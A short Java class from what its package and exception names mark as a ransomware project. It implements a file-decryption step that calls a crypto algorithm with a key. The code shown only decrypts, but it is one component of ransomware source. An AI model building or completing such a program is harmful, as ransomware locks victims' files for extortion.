package Agent.Attack;

import java.io.File;

import Agent.EncryptionAlgo.CryptoAlgorithm;
import Agent.entites.CryptoKey;
import Agent.exceptions.RansomwareException;

public class DecryptFile implements Cryptable {

	@Override
	public void doingCrypto(CryptoKey key, File file, CryptoAlgorithm crypto) throws RansomwareException {
		try {
			crypto.decrypt(key.getKey(), file);
		} catch (RansomwareException e) {
			throw new RansomwareException(e.getMessage(), e.getCause());
		}

	}

}
